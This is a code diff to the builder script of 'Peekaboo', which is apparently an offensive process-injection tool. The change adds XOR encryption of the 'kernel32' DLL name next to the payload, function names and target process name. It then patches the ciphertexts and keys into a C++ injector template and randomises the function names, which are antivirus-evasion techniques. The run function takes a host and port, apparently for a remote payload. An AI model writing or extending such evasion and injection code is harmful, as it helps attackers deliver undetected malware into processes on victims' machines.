@@ -23,6 +23,7 @@ class PeekabooEncryptor():
         self.XOR_PAYLOAD = self.random()
         self.XOR_FUNC = self.random()
         self.XOR_PROC = self.random()
+        self.XOR_DLL = self.random()
 
     def payload_key(self):
         return self.XOR_PAYLOAD
@@ -32,6 +33,9 @@ class PeekabooEncryptor():
 
     def proc_key(self):
         return self.XOR_PROC
+
+    def dll_key(self):
+        return self.XOR_DLL
 
     def xor(self, data, key):
         key = str(key)
@@ -101,6 +105,8 @@ def run_peekaboo(host, port, proc_name, mode):
     f_inj = "Inject("
     f_ftt = "FindTarget"
 
+    k32_name = "kernel32"
+
     print (Colors.BLUE + "process name: " + proc_name + "..." + Colors.ENDC)
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
     f_xor, f_inj, f_ftt = encryptor.random(), encryptor.random(), encryptor.random()
@@ -114,6 +120,7 @@ def run_peekaboo(host, port, proc_name, mode):
     ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
     ciphertext_op, op_key = encryptor.xor_encrypt(f_op, encryptor.func_key())
     ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
+    ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
 
     tmp = open("peekaboo_inj.cpp", "rt")
     data = tmp.read()
@@ -128,10 +135,12 @@ def run_peekaboo(host, port, proc_name, mode):
     data = data.replace('unsigned char s_p32f[] = { };', 'unsigned char s_p32f[] = ' + ciphertext_p32f)
     data = data.replace('unsigned char s_p32n[] = { };', 'unsigned char s_p32n[] = ' + ciphertext_p32n)
     data = data.replace('unsigned char my_proc[] = { };', 'unsigned char my_proc[] = ' + ciphertext_proc)
+    data = data.replace('unsigned char s_k32[] = { };', 'unsigned char s_k32[] = ' + ciphertext_k32)
 
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + vaex_key + '";')
+    data = data.replace('char k32_key[] = "";', 'char k32_key[] = "' + k32_key + '";')
     data = data.replace('XOR(', f_xor + "(")
     data = data.replace("Inject(", f_inj + "(")
     data = data.replace("FindTarget(", f_ftt + "(")
